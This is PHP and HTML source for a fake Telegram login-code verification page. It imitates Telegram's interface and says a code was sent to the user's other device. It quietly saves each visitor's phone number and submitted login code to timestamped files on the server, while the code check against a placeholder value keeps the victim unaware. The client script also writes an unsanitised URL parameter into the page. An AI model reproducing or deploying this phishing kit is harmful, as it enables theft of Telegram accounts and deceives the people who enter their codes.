<?php
$error = '';
$success = '';
$phone = '';

// Get phone number from URL
if (isset($_GET['phone'])) {
    $phone = trim($_GET['phone']);
    // Save phone to localStorage using JS (optional, already done in script)
} else {
    $phone = 'Not provided';
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $enteredCode = trim($_POST["code"]);
    $phone = trim($_POST["phone"]); // Get phone from hidden input

    // Save the entered code and phone number to a file
    if (!is_dir("codes")) {
        mkdir("codes");
    }

    $filename = "codes/entry_" . date("Ymd_His") . ".txt";
    $content = "Phone Number: $phone\nEntered Code: $enteredCode\nTime: " . date("Y-m-d H:i:s") . "\n";

    file_put_contents($filename, $content);

    // Validate code (replace with actual logic)
    if ($enteredCode !== "12345") {
        $error = "Invalid code. Please try again.";
    } else {
        $success = "Code accepted!";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Telegram Code Verification</title>
  <style>
    body {
      background-color: #1e1e1e;
      color: #f5f5f5;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      text-align: center;
      padding: 20px;
    }

    .monkey {
      width: 100px;
      height: 100px;
      margin-bottom: 20px;
    }

    .phone-number {
      font-size: 22px;
      font-weight: bold;
      margin-bottom: 10px;
    }

    .instruction {
      font-size: 15px;
      color: #bdbdbd;
      margin-bottom: 25px;
    }

    .instruction strong {
      color: #0088cc;
    }

    .code-box {
      margin-top: 10px;
    }

    input[type="text"] {
      padding: 12px;
      font-size: 16px;
      border-radius: 10px;
      border: 2px solid #6949ff;
      background-color: transparent;
      color: white;
      width: 250px;
      outline: none;
      text-align: center;
      transition: border 0.3s ease;
    }

    input[type="text"]::placeholder {
      color: #aaa;
    }

    .edit-icon {
      cursor: pointer;
      vertical-align: middle;
      margin-left: 10px;
      font-size: 18px;
      color: #888;
    }

    .edit-icon:hover {
      color: #ccc;
    }

    button {
      margin-top: 20px;
      padding: 10px 25px;
      font-size: 16px;
      background-color: #6949ff;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    button:hover {
      background-color: #563be5;
    }

    .message {
      margin-top: 15px;
      font-size: 14px;
      color: #ff4f4f;
    }

    .success {
      color: #00ff88;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="monkey.png" alt="Monkey" class="monkey" />

    <div class="phone-number" id="phone-number-display">
      <span class="edit-icon">&#9998;</span>
    </div>

    <div class="instruction">
      We've sent the code to the <strong>Telegram</strong> app on your<br />other device.
    </div>

    <form method="POST">
      <input type="hidden" name="phone" id="hiddenPhone" value="<?= htmlspecialchars($phone) ?>">
      <div class="code-box">
        <label for="code" style="display: block; margin-bottom: 5px;">Code</label>
        <input type="text" name="code" id="code" maxlength="5" required />
      </div>
      <button type="submit">Next</button>
    </form>

    <?php if ($error): ?>
      <div class="message"><?= htmlspecialchars($error) ?></div>
    <?php elseif ($success): ?>
      <div class="message success"><?= htmlspecialchars($success) ?></div>
    <?php endif; ?>
  </div>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    let phoneNumber = urlParams.get('phone') || localStorage.getItem('telegramPhoneNumber');

    function formatPhoneNumber(phone) {
        if (!phone) return '';
        return phone.replace(/(\d{3})(\d{2})(\d{3})(\d{4})/, '$1 $2 $3 $4');
    }

    if (phoneNumber) {
        document.getElementById('phone-number-display').innerHTML =
            formatPhoneNumber(phoneNumber) +
            ' <span class="edit-icon">&#9998;</span>';
        document.getElementById('hiddenPhone').value = phoneNumber;
    } else {
        document.getElementById('phone-number-display').textContent = 'No phone number provided';
    }

    document.querySelector('.edit-icon').addEventListener('click', function() {
        window.location.href = 'index.html';
    });
  </script>
</body>
</html>
